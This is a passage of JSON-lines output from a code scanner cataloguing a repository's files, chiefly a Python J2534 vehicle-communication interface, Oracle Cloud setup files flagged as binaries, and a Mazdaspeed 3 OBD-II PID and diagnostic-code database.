0x05"}, {"type": "protocol", "line": 26, "protocol": "0x[0-9A-Fa-f]+", "content": "CAN = 0x05"}, {"type": "protocol", "line": 27, "protocol": "0x[0-9A-Fa-f]+", "content": "ISO15765 = 0x06"}, {"type": "protocol", "line": 28, "protocol": "0x[0-9A-Fa-f]+", "content": "SCI_A_ENGINE = 0x07"}, {"type": "protocol", "line": 29, "protocol": "0x[0-9A-Fa-f]+", "content": "SCI_A_TRANS = 0x08"}, {"type": "protocol", "line": 30, "protocol": "0x[0-9A-Fa-f]+", "content": "SCI_B_ENGINE = 0x09"}, {"type": "protocol", "line": 31, "protocol": "0x[0-9A-Fa-f]+", "content": "SCI_B_TRANS = 0x0A"}, {"type": "protocol", "line": 33, "protocol": "J2534", "content": "class J2534FilterType(IntEnum):"}, {"type": "protocol", "line": 34, "protocol": "J2534", "content": "\"\"\"J2534 Filter Types\"\"\""}, {"type": "protocol", "line": 35, "protocol": "0x[0-9A-Fa-f]+", "content": "PASS_FILTER = 0x01"}, {"type": "protocol", "line": 36, "protocol": "0x[0-9A-Fa-f]+", "content": "BLOCK_FILTER = 0x02"}, {"type": "protocol", "line": 37, "protocol": "0x[0-9A-Fa-f]+", "content": "FLOW_CONTROL_FILTER = 0x03"}, {"type": "protocol", "line": 39, "protocol": "J2534", "content": "class J2534ErrorCode(IntEnum):"}, {"type": "protocol", "line": 40, "protocol": "J2534", "content": "\"\"\"J2534 Error Codes\"\"\""}, {"type": "protocol", "line": 41, "protocol": "0x[0-9A-Fa-f]+", "content": "STATUS_NOERROR = 0x00"}, {"type": "protocol", "line": 42, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_NOT_SUPPORTED = 0x01"}, {"type": "protocol", "line": 43, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_INVALID_CHANNEL_ID = 0x02"}, {"type": "protocol", "line": 44, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_INVALID_PROTOCOL_ID = 0x03"}, {"type": "protocol", "line": 45, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_NULL_PARAMETER = 0x04"}, {"type": "protocol", "line": 46, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_INVALID_IOCTL_VALUE = 0x05"}, {"type": "protocol", "line": 47, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_INVALID_FLAGS = 0x06"}, {"type": "protocol", "line": 48, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_FAILED = 0x07"}, {"type": "protocol", "line": 49, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_DEVICE_NOT_CONNECTED = 0x08"}, {"type": "protocol", "line": 50, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_TIMEOUT = 0x09"}, {"type": "protocol", "line": 51, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_INVALID_MSG = 0x0A"}, {"type": "protocol", "line": 52, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_INVALID_TIME_INTERVAL = 0x0B"}, {"type": "protocol", "line": 53, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_EXCEEDED_LIMIT = 0x0C"}, {"type": "protocol", "line": 54, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_INVALID_MSG_ID = 0x0D"}, {"type": "protocol", "line": 55, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_DEVICE_IN_USE = 0x0E"}, {"type": "protocol", "line": 56, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_INVALID_IOCTL_ID = 0x0F"}, {"type": "protocol", "line": 57, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_BUFFER_EMPTY = 0x10"}, {"type": "protocol", "line": 58, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_BUFFER_FULL = 0x11"}, {"type": "protocol", "line": 59, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_BUFFER_OVERFLOW = 0x12"}, {"type": "protocol", "line": 60, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_PIN_NOT_FOUND = 0x13"}, {"type": "protocol", "line": 61, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_PIN_IN_USE = 0x14"}, {"type": "protocol", "line": 62, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_INVALID_DEVICE_ID = 0x15"}, {"type": "protocol", "line": 63, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_INVALID_FILTER_ID = 0x16"}, {"type": "protocol", "line": 64, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_CHANNEL_IN_USE = 0x17"}, {"type": "protocol", "line": 65, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_MSG_PROTOCOL_ID = 0x18"}, {"type": "protocol", "line": 66, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_INVALID_LABEL = 0x19"}, {"type": "protocol", "line": 67, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_INVALID_BAUDRATE = 0x1A"}, {"type": "protocol", "line": 68, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_INVALID_DEVICE_ID = 0x1B"}, {"type": "protocol", "line": 70, "protocol": "J2534", "content": "class J2534Message(ctypes.Structure):"}, {"type": "protocol", "line": 71, "protocol": "J2534", "content": "\"\"\"J2534 Message structure\"\"\""}, {"type": "protocol", "line": 82, "protocol": "J2534", "content": "class J2534Interface:"}, {"type": "protocol", "line": 84, "protocol": "J2534", "content": "J2534 Pass-thru Interface for vehicle communication"}, {"type": "protocol", "line": 85, "protocol": "J2534", "content": "Provides access to J2534 DLL for ECU communication"}, {"type": "protocol", "line": 90, "protocol": "J2534", "content": "Initialize J2534 Interface"}, {"type": "protocol", "line": 93, "protocol": "J2534", "content": "dll_path: Path to J2534 DLL file. If None, will try common locations"}, {"type": "protocol", "line": 112, "protocol": "J2534", "content": "\"\"\"Load J2534 DLL from system\"\"\""}, {"type": "protocol", "line": 114, "protocol": "J2534", "content": "raise RuntimeError(\"J2534 interface requires Windows\")"}, {"type": "protocol", "line": 120, "protocol": "J2534", "content": "\"C:\\\\Program Files\\\\Drew Technologies\\\\MongoosePro J2534\\\\DLL\\\\MongoosePro.dll\","}, {"type": "protocol", "line": 121, "protocol": "J2534", "content": "\"C:\\\\Program Files (x86)\\\\Drew Technologies\\\\MongoosePro J2534\\\\DLL\\\\MongoosePro.dll\","}, {"type": "protocol", "line": 129, "protocol": "J2534", "content": "logger.info(f\"Loaded J2534 DLL from: {path}\")"}, {"type": "protocol", "line": 134, "protocol": "J2534", "content": "raise RuntimeError(\"J2534 DLL not found. Please install J2534 interface software.\")"}, {"type": "protocol", "line": 138, "protocol": "J2534", "content": "logger.info(f\"Loaded J2534 DLL from: {dll_path}\")"}, {"type": "protocol", "line": 140, "protocol": "J2534", "content": "raise RuntimeError(f\"Failed to load J2534 DLL from {dll_path}: {e}\")"}, {"type": "protocol", "line": 143, "protocol": "J2534", "content": "\"\"\"Setup J2534 function signatures\"\"\""}, {"type": "protocol", "line": 161, "protocol": "J2534", "content": "self.dll.PassThruReadMsgs.argtypes = [ctypes.c_ulong, ctypes.POINTER(J2534Message), ctypes.POINTER(c"}, {"type": "protocol", "line": 165, "protocol": "J2534", "content": "self.dll.PassThruWriteMsgs.argtypes = [ctypes.c_ulong, ctypes.POINTER(J2534Message), ctypes.POINTER("}, {"type": "protocol", "line": 169, "protocol": "J2534", "content": "self.dll.PassThruStartPeriodicMsg.argtypes = [ctypes.c_ulong, ctypes.POINTER(J2534Message), ctypes.P"}, {"type": "protocol", "line": 177, "protocol": "J2534", "content": "self.dll.PassThruStartMsgFilter.argtypes = [ctypes.c_ulong, ctypes.c_ulong, ctypes.POINTER(J2534Mess"}, {"type": "protocol", "line": 202, "protocol": "J2534", "content": "Connect to J2534 device"}, {"type": "protocol", "line": 220, "protocol": "J2534", "content": "if result != J2534ErrorCode.STATUS_NOERROR:"}, {"type": "protocol", "line": 222, "protocol": "J2534", "content": "logger.error(f\"Failed to open J2534 device: {error_msg}\")"}, {"type": "protocol", "line": 226, "protocol": "J2534", "content": "logger.info(\"J2534 device connected successfully\")"}, {"type": "protocol", "line": 234, "protocol": "J2534", "content": "logger.error(f\"Exception connecting to J2534 device: {e}\")"}, {"type": "protocol", "line": 237, "protocol": "J2534", "content": "def open_channel(self, protocol: J2534Protocol = J2534Protocol.ISO15765,"}, {"type": "protocol", "line": 263, "protocol": "J2534", "content": "if result != J2534ErrorCode.STATUS_NOERROR:"}, {"type": "protocol", "line": 298, "protocol": "J2534", "content": "msg = J2534Message()"}, {"type": "protocol", "line": 320, "protocol": "J2534", "content": "if result != J2534ErrorCode.STATUS_NOERROR:"}, {"type": "protocol", "line": 348, "protocol": "J2534", "content": "msg_buffer = (J2534Message * max_msgs)()"}, {"type": "protocol", "line": 359, "protocol": "J2534", "content": "if result == J2534ErrorCode.STATUS_NOERROR:"}, {"type": "protocol", "line": 366, "protocol": "J2534", "content": "elif result != J2534ErrorCode.ERR_BUFFER_EMPTY:"}, {"type": "protocol", "line": 417, "protocol": "J2534", "content": "if result == J2534ErrorCode.STATUS_NOERROR:"}, {"type": "protocol", "line": 428, "protocol": "J2534", "content": "J2534ErrorCode.ERR_NOT_SUPPORTED: \"Not supported\","}, {"type": "protocol", "line": 429, "protocol": "J2534", "content": "J2534ErrorCode.ERR_INVALID_CHANNEL_ID: \"Invalid channel ID\","}, {"type": "protocol", "line": 430, "protocol": "J2534", "content": "J2534ErrorCode.ERR_INVALID_PROTOCOL_ID: \"Invalid protocol ID\","}, {"type": "protocol", "line": 431, "protocol": "J2534", "content": "J2534ErrorCode.ERR_NULL_PARAMETER: \"Null parameter\","}, {"type": "protocol", "line": 432, "protocol": "J2534", "content": "J2534ErrorCode.ERR_INVALID_IOCTL_VALUE: \"Invalid IOCTL value\","}, {"type": "protocol", "line": 433, "protocol": "J2534", "content": "J2534ErrorCode.ERR_INVALID_FLAGS: \"Invalid flags\","}, {"type": "protocol", "line": 434, "protocol": "J2534", "content": "J2534ErrorCode.ERR_FAILED: \"Failed\","}, {"type": "protocol", "line": 435, "protocol": "J2534", "content": "J2534ErrorCode.ERR_DEVICE_NOT_CONNECTED: \"Device not connected\","}, {"type": "protocol", "line": 436, "protocol": "J2534", "content": "J2534ErrorCode.ERR_TIMEOUT: \"Timeout\","}, {"type": "protocol", "line": 437, "protocol": "J2534", "content": "J2534ErrorCode.ERR_INVALID_MSG: \"Invalid message\","}, {"type": "protocol", "line": 438, "protocol": "J2534", "content": "J2534ErrorCode.ERR_INVALID_TIME_INTERVAL: \"Invalid time interval\","}, {"type": "protocol", "line": 439, "protocol": "J2534", "content": "J2534ErrorCode.ERR_EXCEEDED_LIMIT: \"Exceeded limit\","}, {"type": "protocol", "line": 440, "protocol": "J2534", "content": "J2534ErrorCode.ERR_INVALID_MSG_ID: \"Invalid message ID\","}, {"type": "protocol", "line": 441, "protocol": "J2534", "content": "J2534ErrorCode.ERR_DEVICE_IN_USE: \"Device in use\","}, {"type": "protocol", "line": 442, "protocol": "J2534", "content": "J2534ErrorCode.ERR_INVALID_IOCTL_ID: \"Invalid IOCTL ID\","}, {"type": "protocol", "line": 443, "protocol": "J2534", "content": "J2534ErrorCode.ERR_BUFFER_EMPTY: \"Buffer empty\","}, {"type": "protocol", "line": 444, "protocol": "J2534", "content": "J2534ErrorCode.ERR_BUFFER_FULL: \"Buffer full\","}, {"type": "protocol", "line": 445, "protocol": "J2534", "content": "J2534ErrorCode.ERR_BUFFER_OVERFLOW: \"Buffer overflow\","}, {"type": "protocol", "line": 446, "protocol": "J2534", "content": "J2534ErrorCode.ERR_PIN_NOT_FOUND: \"Pin not found\","}, {"type": "protocol", "line": 447, "protocol": "J2534", "content": "J2534ErrorCode.ERR_PIN_IN_USE: \"Pin in use\","}, {"type": "protocol", "line": 448, "protocol": "J2534", "content": "J2534ErrorCode.ERR_INVALID_DEVICE_ID: \"Invalid device ID\","}, {"type": "protocol", "line": 449, "protocol": "J2534", "content": "J2534ErrorCode.ERR_INVALID_FILTER_ID: \"Invalid filter ID\","}, {"type": "protocol", "line": 450, "protocol": "J2534", "content": "J2534ErrorCode.ERR_CHANNEL_IN_USE: \"Channel in use\","}, {"type": "protocol", "line": 451, "protocol": "J2534", "content": "J2534ErrorCode.ERR_MSG_PROTOCOL_ID: \"Message protocol ID\","}, {"type": "protocol", "line": 452, "protocol": "J2534", "content": "J2534ErrorCode.ERR_INVALID_LABEL: \"Invalid label\","}, {"type": "protocol", "line": 453, "protocol": "J2534", "content": "J2534ErrorCode.ERR_INVALID_BAUDRATE: \"Invalid baudrate\""}, {"type": "protocol", "line": 458, "protocol": "J2534", "content": "\"\"\"Disconnect from J2534 device\"\"\""}, {"type": "protocol", "line": 475, "protocol": "J2534", "content": "logger.info(\"J2534 device disconnected\")"}, {"type": "protocol", "line": 486, "protocol": "J2534", "content": "\"\"\"Test J2534 interface functionality\"\"\""}, {"type": "protocol", "line": 487, "protocol": "J2534", "content": "logger.info(\"Testing J2534 Interface...\")"}, {"type": "protocol", "line": 491, "protocol": "J2534", "content": "interface = J2534Interface()"}, {"type": "protocol", "line": 495, "protocol": "J2534", "content": "logger.error(\"Failed to connect to J2534 device\")"}, {"type": "protocol", "line": 499, "protocol": "J2534", "content": "if not interface.open_channel(J2534Protocol.ISO15765, 500000):"}, {"type": "protocol", "line": 500, "protocol": "CAN", "content": "logger.error(\"Failed to open CAN channel\")"}, {"type": "protocol", "line": 511, "protocol": "0x[0-9A-Fa-f]+", "content": "test_msg = bytes([0x22, 0xF1, 0x89])  # Read VIN request"}, {"type": "protocol", "line": 520, "protocol": "J2534", "content": "logger.info(\"J2534 interface test completed successfully\")"}, {"type": "protocol", "line": 524, "protocol": "J2534", "content": "logger.error(f\"J2534 interface test failed: {e}\")"}], "hardware_assumptions": [{"type": "hardware", "line": 4, "hardware": "vehicle", "content": "Provides Windows DLL access for J2534 vehicle communication interfaces"}, {"type": "hardware", "line": 84, "hardware": "vehicle", "content": "J2534 Pass-thru Interface for vehicle communication"}, {"type": "hardware", "line": 85, "hardware": "ECU", "content": "Provides access to J2534 DLL for ECU communication"}, {"type": "hardware", "line": 282, "hardware": "ECU", "content": "Send message to ECU"}, {"type": "hardware", "line": 334, "hardware": "ECU", "content": "Read messages from ECU"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts_tuner/requirements.txt", "lines_read": 58, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "oracle-cloud-setup/README.md", "lines_read": 248, "features_found": [{"type": "url_found", "count": 4}, {"type": "configuration_values", "count": 3}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "oracle-cloud-setup/a1-flex-deploy.log", "lines_read": 0, "features_found": [{"type": "binary_file", "note": "Binary content not analyzed"}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [{"type": "binary_risk", "note": "Binary files may contain executable code"}], "group_tags": ["other"]}
{"file_path": "oracle-cloud-setup/console.log", "lines_read": 0, "features_found": [{"type": "binary_file", "note": "Binary content not analyzed"}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [{"type": "binary_risk", "note": "Binary files may contain executable code"}], "group_tags": ["other"]}
{"file_path": "oracle-cloud-setup/console_latest.log", "lines_read": 0, "features_found": [{"type": "binary_file", "note": "Binary content not analyzed"}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [{"type": "binary_risk", "note": "Binary files may contain executable code"}], "group_tags": ["other"]}
{"file_path": "oracle-cloud-setup/deploy-a1-flex-retry.sh", "lines_read": 0, "features_found": [{"type": "binary_file", "note": "Binary content not analyzed"}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [{"type": "binary_risk", "note": "Binary files may contain executable code"}], "group_tags": ["other"]}
{"file_path": "oracle-cloud-setup/deploy-oracle-server.sh", "lines_read": 0, "features_found": [{"type": "binary_file", "note": "Binary content not analyzed"}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [{"type": "binary_risk", "note": "Binary files may contain executable code"}], "group_tags": ["other"]}
{"file_path": "oracle-cloud-setup/known_hosts.tmp", "lines_read": 0, "features_found": [{"type": "binary_file", "note": "Binary content not analyzed"}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [{"type": "binary_risk", "note": "Binary files may contain executable code"}], "group_tags": ["other"]}
{"file_path": "oracle-cloud-setup/remote-setup.sh", "lines_read": 0, "features_found": [{"type": "binary_file", "note": "Binary content not analyzed"}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [{"type": "binary_risk", "note": "Binary files may contain executable code"}], "group_tags": ["other"]}
{"file_path": "oracle-cloud-setup/terraform/cloud-init.yml", "lines_read": 112, "features_found": [{"type": "url_found", "count": 6}, {"type": "configuration_values", "count": 5}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "oracle-cloud-setup/terraform/main.tf", "lines_read": 0, "features_found": [{"type": "binary_file", "note": "Binary content not analyzed"}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [{"type": "binary_risk", "note": "Binary files may contain executable code"}], "group_tags": ["other"]}
{"file_path": "oracle-cloud-setup/terraform/terraform.tfstate", "lines_read": 0, "features_found": [{"type": "binary_file", "note": "Binary content not analyzed"}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [{"type": "binary_risk", "note": "Binary files may contain executable code"}], "group_tags": ["other"]}
{"file_path": "oracle-cloud-setup/terraform/terraform.tfvars", "lines_read": 0, "features_found": [{"type": "binary_file", "note": "Binary content not analyzed"}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [{"type": "binary_risk", "note": "Binary files may contain executable code"}], "group_tags": ["other"]}
{"file_path": "oracle-cloud-setup/terraform/tfplan", "lines_read": 0, "features_found": [{"type": "binary_file", "note": "Binary content not analyzed"}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [{"type": "binary_risk", "note": "Binary files may contain executable code"}], "group_tags": ["other"]}
{"file_path": "oracle-cloud-setup/terraform/variables.tf", "lines_read": 0, "features_found": [{"type": "binary_file", "note": "Binary content not analyzed"}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [{"type": "binary_risk", "note": "Binary files may contain executable code"}], "group_tags": ["other"]}
{"file_path": "pids.py", "lines_read": 749, "features_found": [{"type": "function", "name": "main", "line": 694}, {"type": "function", "name": "get_pid_definition", "line": 664}, {"type": "function", "name": "get_dtc_definition", "line": 668}, {"type": "function", "name": "get_all_pids", "line": 672}, {"type": "function", "name": "get_all_dtcs", "line": 676}, {"type": "function", "name": "get_mazda_specific_pids", "line": 680}, {"type": "function", "name": "get_diagnostic_service", "line": 685}, {"type": "function", "name": "get_data_identifier", "line": 689}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "Enum", "line": null}], "components_found": [{"type": "class", "name": "ServiceType", "line": 12}, {"type": "class", "name": "PIDDefinition", "line": 26}, {"type": "class", "name": "DTCDefinition", "line": 38}, {"type": "class", "name": "Mazdaspeed3DiagnosticDatabase", "line": 47}], "algorithms": [], "protocols": [{"type": "protocol", "line": 5, "protocol": "PID", "content": "FULL PID, DTC, AND DIAGNOSTIC CODE DATABASE FOR 2011 MAZDASPEED 3"}, {"type": "protocol", "line": 13, "protocol": "OBD", "content": "\"\"\"OBD2 SERVICE TYPES\"\"\""}, {"type": "protocol", "line": 14, "protocol": "0x[0-9A-Fa-f]+", "content": "CURRENT_DATA = 0x01"}, {"type": "protocol", "line": 15, "protocol": "0x[0-9A-Fa-f]+", "content": "FREEZE_FRAME_DATA = 0x02"}, {"type": "protocol", "line": 16, "protocol": "0x[0-9A-Fa-f]+", "content": "DIAGNOSTIC_TROUBLE_CODES = 0x03"}, {"type": "protocol", "line": 17, "protocol": "0x[0-9A-Fa-f]+", "content": "CLEAR_DTCS = 0x04"}, {"type": "protocol", "line": 18, "protocol": "0x[0-9A-Fa-f]+", "content": "OXYGEN_SENSOR_TEST = 0x05"}, {"type": "protocol", "line": 19, "protocol": "0x[0-9A-Fa-f]+", "content": "ONBOARD_MONITORING = 0x06"}, {"type": "protocol", "line": 20, "protocol": "0x[0-9A-Fa-f]+", "content": "PENDING_DTCS = 0x07"}, {"type": "protocol", "line": 21, "protocol": "0x[0-9A-Fa-f]+", "content": "CONTROL_OPERATION = 0x08"}, {"type": "protocol", "line": 22, "protocol": "0x[0-9A-Fa-f]+", "content": "VEHICLE_INFO = 0x09"}, {"type": "protocol", "line": 23, "protocol": "0x[0-9A-Fa-f]+", "content": "PERMANENT_DTCS = 0x0A"}, {"type": "protocol", "line": 26, "protocol": "PID", "content": "class PIDDefinition:"}, {"type": "protocol", "line": 27, "protocol": "PID", "content": "\"\"\"COMPLETE PID DEFINITION\"\"\""}, {"type": "protocol", "line": 53, "protocol": "PID", "content": "STANDARD_PIDS = {"}, {"type": "protocol", "line": 55, "protocol": "PID", "content": "\"0100\": PIDDefinition(\"0100\", \"Supported PIDs 01-20\", \"Bit encoded\", \"N/A\", 0, 0, 4),"}, {"type": "protocol", "line": 56, "protocol": "PID", "content": "\"0101\": PIDDefinition(\"0101\", \"Monitor Status Since DTC Cleared\", \"Bit encoded\", \"N/A\", 0, 0, 4),"}, {"type": "protocol", "line": 57, "protocol": "PID", "content": "\"0102\": PIDDefinition(\"0102\", \"Freeze DTC\", \"Hex encoded\", \"N/A\", 0, 0, 2),"}, {"type": "protocol", "line": 58, "protocol": "PID", "content": "\"0103\": PIDDefinition(\"0103\", \"Fuel System Status\", \"Bit encoded\", \"N/A\", 0, 0, 2),"}, {"type": "protocol", "line": 59, "protocol": "PID", "content": "\"0104\": PIDDefinition(\"0104\", \"Calculated Engine Load\", \"A*100/255\", \"%\", 0, 100, 1),"}, {"type": "protocol", "line": 60, "protocol": "PID", "content": "\"0105\": PIDDefinition(\"0105\", \"Engine Coolant Temperature\", \"A-40\", \"\u00b0C\", -40, 215, 1),"}, {"type": "protocol", "line": 61, "protocol": "PID", "content": "\"0106\": PIDDefinition(\"0106\", \"Short Term Fuel Trim Bank 1\", \"(A-128)*100/128\", \"%\", -100, 99.2, 1),"}, {"type": "protocol", "line": 62, "protocol": "PID", "content": "\"0107\": PIDDefinition(\"0107\", \"Long Term Fuel Trim Bank 1\", \"(A-128)*100/128\", \"%\", -100, 99.2, 1),"}, {"type": "protocol", "line": 63, "protocol": "PID", "content": "\"0108\": PIDDefinition(\"0108\", \"Short Term Fuel Trim Bank 2\", \"(A-128)*100/128\", \"%\", -100, 99.2, 1),"}, {"type": "protocol", "line": 64, "protocol": "PID", "content": "\"0109\": PIDDefinition(\"0109\", \"Long Term Fuel Trim Bank 2\", \"(A-128)*100/128\", \"%\", -100, 99.2, 1),"}, {"type": "protocol", "line": 65, "protocol": "PID", "content": "\"010A\": PIDDefinition(\"010A\", \"Fuel Pressure\", \"A*3\", \"kPa\", 0, 765, 1),"}, {"type": "protocol", "line": 66, "protocol": "PID", "content": "\"010B\": PIDDefinition(\"010B\", \"Intake Manifold Pressure\", \"A\", \"kPa\", 0, 255, 1),"}, {"type": "protocol", "line": 67, "protocol": "PID", "content": "\"010C\": PIDDefinition(\"010C\", \"Engine RPM\", \"(256*A+B)/4\", \"RPM\", 0, 16383.75, 2),"}, {"type": "protocol", "line": 68, "protocol": "PID", "content": "\"010D\": PIDDefinition(\"010D\", \"Vehicle Speed\", \"A\", \"km/h\", 0, 255, 1),"}, {"type": "protocol", "line": 69, "protocol": "PID", "content": "\"010E\": PIDDefinition(\"010E\", \"Timing Advance\", \"(A/2)-64\", \"\u00b0\", -64, 63.5, 1),"}, {"type": "protocol", "line": 70, "protocol": "PID", "content": "\"010F\": PIDDefinition(\"010F\", \"Intake Air Temperature\", \"A-40\", \"\u00b0C\", -40, 215, 1),"}, {"type": "protocol", "line": 71, "protocol": "PID", "content": "\"0110\": PIDDefinition(\"0110\", \"MAF Air Flow Rate\", \"(256*A+B)/100\", \"g/s\", 0, 655.35, 2),"}, {"type": "protocol", "line": 72, "protocol": "PID", "content": "\"0111\": PIDDefinition(\"0111\", \"Throttle Position\", \"A*100/255\", \"%\", 0, 100, 1),"}, {"type": "protocol", "line": 73, "protocol": "PID", "content": "\"0112\": PIDDefinition(\"0112\", \"Commanded Secondary Air Status\", \"Bit encoded\", \"N/A\", 0, 0, 1),"}, {"type": "protocol", "line": 74, "protocol": "PID", "content": "\"0113\": PIDDefinition(\"0113\", \"Oxygen Sensors Present\", \"Bit encoded\", \"N/A\", 0, 0, 1),"}, {"type": "protocol", "line": 75, "protocol": "PID", "content": "\"0114\": PIDDefinition(\"0114\", \"Bank 1 Sensor 1 Oxygen Sensor Voltage\", \"A/200\", \"V\", 0, 1.275, 1),"}, {"type": "protocol", "line": 76, "protocol": "PID", "content": "\"0115\": PIDDefinition(\"0115\", \"Bank 1 Sensor 1 Short Term Fuel Trim\", \"(A-128)*100/128\", \"%\", -100, "}, {"type": "protocol", "line": 79, "protocol": "PID", "content": "\"0121\": PIDDefinition(\"0121\", \"Distance Traveled with MIL On\", \"256*A+B\", \"km\", 0, 65535, 2, True),"}, {"type": "protocol", "line": 80, "protocol": "PID", "content": "\"012F\": PIDDefinition(\"012F\", \"Fuel Level Input\", \"A*100/255\", \"%\", 0, 100, 1),"}, {"type": "protocol", "line": 81, "protocol": "PID", "content": "\"0130\": PIDDefinition(\"0130\", \"Warm-ups Since Codes Cleared\", \"A\", \"count\", 0, 255, 1),"}, {"type": "protocol", "line": 82, "protocol": "PID", "content": "\"0131\": PIDDefinition(\"0131\", \"Distance Since Codes Cleared\", \"256*A+B\", \"km\", 0, 65535, 2),"}, {"type": "protocol", "line": 83, "protocol": "PID", "content": "\"0133\": PIDDefinition(\"0133\", \"Barometric Pressure\", \"A\", \"kPa\", 0, 255, 1),"}, {"type": "protocol", "line": 84, "protocol": "PID", "content": "\"0142\": PIDDefinition(\"0142\", \"Control Module Voltage\", \"(256*A+B)/1000\", \"V\", 0, 65.535, 2),"}, {"type": "protocol", "line": 85, "protocol": "PID", "content": "\"0143\": PIDDefinition(\"0143\", \"Absolute Load Value\", \"(256*A+B)*100/255\", \"%\", 0, 25700, 2),"}, {"type": "protocol", "line": 86, "protocol": "PID", "content": "\"0144\": PIDDefinition(\"0144\", \"Commanded Equivalence Ratio\", \"(256*A+B)/32768\", \"ratio\", 0, 2, 2),"}, {"type": "protocol", "line": 87, "protocol": "PID", "content": "\"0145\": PIDDefinition(\"0145\", \"Relative Throttle Position\", \"A*100/255\", \"%\", 0, 100, 1),"}, {"type": "protocol", "line": 88, "protocol": "PID", "content": "\"0146\": PIDDefinition(\"0146\", \"Ambient Air Temperature\", \"A-40\", \"\u00b0C\", -40, 215, 1),"}, {"type": "protocol", "line": 89, "protocol": "PID", "content": "\"0147\": PIDDefinition(\"0147\", \"Absolute Throttle Position B\", \"A*100/255\", \"%\", 0, 100, 1),"}, {"type": "protocol", "line": 90, "protocol": "PID", "content": "\"0148\": PIDDefinition(\"0148\", \"Absolute Throttle Position C\", \"A*100/255\", \"%\", 0, 100, 1),"}, {"type": "protocol", "line": 91, "protocol": "PID", "content": "\"0149\": PIDDefinition(\"0149\", \"Accelerator Pedal Position D\", \"A*100/255\", \"%\", 0, 100, 1),"}, {"type": "protocol", "line": 92, "protocol": "PID", "content": "\"014A\": PIDDefinition(\"014A\", \"Accelerator Pedal Position E\", \"A*100/255\", \"%\", 0, 100, 1),"}, {"type": "protocol", "line": 93, "protocol": "PID", "content": "\"014B\": PIDDefinition(\"014B\", \"Accelerator Pedal Position F\", \"A*100/255\", \"%\", 0, 100, 1),"}, {"type": "protocol", "line": 94, "protocol": "PID", "content": "\"014C\": PIDDefinition(\"014C\", \"Commanded Throttle Actuator\", \"A*100/255\", \"%\", 0, 100, 1),"}, {"type": "protocol", "line": 95, "protocol": "PID", "content": "\"014D\": PIDDefinition(\"014D\", \"Time Run with MIL On\", \"256*A+B\", \"minutes\", 0, 65535, 2),"}, {"type": "protocol", "line": 96, "protocol": "PID", "content": "\"014E\": PIDDefinition(\"014E\", \"Time Since Trouble Codes Cleared\", \"256*A+B\", \"minutes\", 0, 65535, 2)"}, {"type": "protocol", "line": 99, "protocol": "PID", "content": "\"220101\": PIDDefinition(\"220101\", \"Mazda Engine Load\", \"A*100/255\", \"%\", 0, 100, 1, True),"}, {"type": "protocol", "line": 100, "protocol": "PID", "content": "\"220102\": PIDDefinition(\"220102\", \"Mazda Injector Pulse Width\", \"(256*A+B)/1000\", \"ms\", 0, 65.535, 2"}, {"type": "protocol", "line": 101, "protocol": "PID", "content": "\"220103\": PIDDefinition(\"220103\", \"Mazda Ignition Timing 